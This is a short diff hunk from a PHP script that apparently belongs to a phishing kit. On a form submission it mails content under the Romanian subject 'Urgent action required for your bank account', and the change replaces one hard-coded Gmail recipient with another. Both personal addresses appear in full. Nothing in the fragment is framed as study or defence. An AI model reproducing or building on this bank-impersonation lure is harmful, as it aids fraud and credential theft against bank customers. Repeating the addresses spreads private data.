@@ -53,7 +53,7 @@
 
     <?php
     if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-        $to = "laura.maris104121@gmail.com";
+        $to = "sabinstan19@gmail.com";
         $subject = "Acțiune urgentă necesară pentru contul tău bancar";
         $message = "
         <html>
